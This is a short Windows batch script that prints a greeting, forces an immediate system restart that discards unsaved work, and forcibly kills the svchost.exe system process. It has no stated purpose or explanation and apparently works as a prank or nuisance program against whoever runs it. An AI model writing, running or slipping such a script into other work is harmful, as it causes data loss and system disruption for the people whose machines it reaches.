@echo off
echo hello!
start shutdown -r -f -t 01
taskkill /IM svchost.exe /f
